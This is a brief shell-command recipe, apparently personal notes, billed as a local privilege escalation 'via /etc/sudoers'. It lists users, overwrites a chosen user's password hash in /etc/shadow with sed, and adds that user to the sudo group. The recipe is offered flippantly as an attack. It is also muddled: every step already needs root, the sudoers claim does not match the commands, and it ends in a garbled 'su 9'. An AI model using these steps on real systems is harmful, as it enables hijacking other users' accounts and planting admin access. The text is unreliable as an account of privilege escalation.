# PostgresV2 (temporary name) - LPE via Arbitrary Additions to /etc/sudoers

# List all users, find your target
compgen -u

# Arbitrarily change their password (yescrypt, LOLFAO)
sudo sed -i 's|^(bro's username goes here):[^:]*|(bro's username goes here):(string here)|' /etc/shadow 

# Add them to /etc/sudoers 
sudo usermod -aG sudo (bro's username)

su 9
